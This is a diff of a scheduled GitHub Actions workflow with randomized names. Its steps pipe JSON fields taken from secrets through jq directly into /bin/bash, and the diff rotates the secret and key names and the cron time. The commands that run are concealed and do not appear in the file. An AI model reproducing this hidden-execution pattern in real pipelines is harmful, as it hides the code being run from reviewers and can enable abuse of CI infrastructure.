@@ -2,28 +2,26 @@ name: huojiaquan3627
 on:
   workflow_dispatch:
   schedule:
-    - cron: '16 1/6 * * *'
+    - cron: '40 5/6 * * *'
 
-jobs:  # 1743
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: huojiaquan3627
         env:
-          bhj4: ${{ secrets.bhj4 }}
+          kkh1429: ${{ secrets.kkh1429 }}
         run: |
-          echo $bhj4 | jq -r .gjpta5 | /bin/bash
-          echo $h6 | jq -r .celxl473 | /bin/bash
-          echo $pb26144 | jq -r .lgm46 | /bin/bash
-          echo $vv715 | jq -r .zl15 | /bin/bash
-          echo $a46 | jq -r .gqsj6 | /bin/bash
-          echo $btuy53 | jq -r .dbgg6 | /bin/bash
-          echo $du6294 | jq -r .fxdr7477 | /bin/bash
-          echo $yhj38 | jq -r .cpjvq20328 | /bin/bash
-          echo $t81231 | jq -r .omt7 | /bin/bash
-          echo $p2 | jq -r .klhxg3362 | /bin/bash
-          echo $vyk736 | jq -r .sfl98664 | /bin/bash
-          echo $vu4299 | jq -r .yaao4561 | /bin/bash
+          echo $kkh1429 | jq -r .csnk58 | /bin/bash
+          echo $ai6409 | jq -r .gw686 | /bin/bash
+          echo $ylwa83501 | jq -r .tywj34 | /bin/bash
+          echo $dk82742 | jq -r .ubgjm9 | /bin/bash
+          echo $bqmmk8812 | jq -r .vvw749 | /bin/bash
+          echo $jvut564 | jq -r .zjs37171 | /bin/bash
+          echo $vycs3864 | jq -r .tnony3 | /bin/bash
+          echo $gbmmo250 | jq -r .vflh79355 | /bin/bash
+          echo $tzgyu85970 | jq -r .qhom7189 | /bin/bash
+          echo $rwmni62658 | jq -r .e81730 | /bin/bash
+          echo $wqghw856 | jq -r .aq064 | /bin/bash
 
